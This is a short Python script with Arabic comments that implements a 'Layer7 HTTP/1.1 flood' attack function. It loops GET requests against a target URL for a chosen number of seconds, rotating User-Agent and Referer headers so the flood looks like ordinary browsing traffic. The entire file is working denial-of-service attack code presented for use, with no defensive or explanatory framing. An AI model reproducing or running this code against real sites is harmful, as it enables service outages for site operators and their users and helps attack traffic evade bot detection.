import requests
import random
import time

# قائمة User Agents متنوعة لمحاكاة تصفح حقيقي
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
]

# قائمة مراجع (Referers) متنوعة
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
]

def layer7_http_flood(target_url: str, duration: int) -> None:
    """
    هجوم Layer7 HTTP/1.1 Flood مع رؤوس متغيرة لمحاكاة تصفح طبيعي.
    
    :param target_url: رابط الهدف (مثال: http://example.com)
    :param duration: مدة الهجوم بالثواني
    """
    timeout = time.time() + duration
    while time.time() < timeout:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": random.choice(REFERERS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
        }
        try:
            response = requests.get(target_url, headers=headers, timeout=10)
            print(f"[Layer7 HTTP/1.1] Request sent - Status: {response.status_code}")
        except requests.RequestException as e:
            print(f"[Layer7 HTTP/1.1] Request error: {e}")